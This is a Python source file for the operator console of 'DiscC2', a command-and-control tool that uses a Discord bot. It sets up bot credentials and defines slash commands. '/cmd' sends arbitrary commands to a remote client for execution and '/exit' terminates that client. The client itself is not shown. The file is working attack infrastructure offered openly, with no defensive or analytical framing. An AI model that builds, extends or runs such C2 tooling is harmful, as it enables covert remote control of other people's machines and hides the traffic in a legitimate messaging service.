import os
import json
import time
import requests
import discord
from discord import app_commands

CONFIG_FILE = "settings.json"

def print_banner():
    print("""
██████╗ ██╗███████╗ ██████╗     ██████╗██████╗ 
██╔══██╗██║██╔════╝██╔════╝    ██╔════╝╚════██╗
██║  ██║██║███████╗██║         ██║      █████╔╝
██║  ██║██║╚════██║██║         ██║     ██╔═══╝ 
██████╔╝██║███████║╚██████╗    ╚██████╗███████╗
╚═════╝ ╚═╝╚══════╝ ╚═════╝     ╚═════╝╚══════╝
           github.com/N3agu/DiscC2
""")

def load_or_create_config():
    required_keys = ["bot_token", "channel_id", "webhook_url"]
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                config = json.load(f)
            if all(key in config for key in required_keys):
                return config
            else:
                print("[!] settings.json is missing fields. Recreating...")
        except json.JSONDecodeError:
            print("[!] settings.json is malformed. Recreating...")

    print("[!] Configuration not found. Setting up DiscC2.")
    print("\n[i] HOW TO OBTAIN DISCORD CREDENTIALS:")
    print("    1. Go to Discord Developer Portal -> Applications -> New Application.")
    print("    2. Give your bot a name, accept ToS and click 'Create'.")
    print("    3. Under 'Bot', click 'Reset Token' to get your Bot Token.")
    print("    4. Invite the bot to your server with at least 'Read/Send Messages' permissions.")
    print("    5. In your Discord App, go to Advanced Settings and enable 'Developer Mode'.")
    print("    6. Right-click your private channel, select 'Copy Channel ID'.")
    print("    7. In Channel Settings -> Integrations -> Create a Webhook and copy its URL.\n")
    
    bot_token = input("[+] Discord Bot Token: ")
    channel_id = input("[+] Channel ID: ")
    webhook_url = input("[+] Webhook URL (Optional): ")
    
    config = {
        "bot_token": bot_token, 
        "channel_id": channel_id, 
        "webhook_url": webhook_url
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)
    print("[!] Settings saved to settings.json\n")
    return config

class DiscC2Bot(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.default())
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()

bot = DiscC2Bot()

@bot.tree.command(name="cmd", description="Execute a command on the client")
@app_commands.describe(command="The command to execute")
async def cmd(interaction: discord.Interaction, command: str):
    await interaction.response.send_message(f"[Task] {command}")

@bot.tree.command(name="exit", description="Kill the client")
async def exit_client(interaction: discord.Interaction):
    await interaction.response.send_message("[Task] exit")

@bot.event
async def on_ready():
    print(f"[*] Logged in as {bot.user}")
    print("[*] Bot is ready. Use /cmd and /exit in your Discord server.")

def main():
    print_banner()
    config = load_or_create_config()
    bot.run(config["bot_token"])

if __name__ == "__main__":
    main()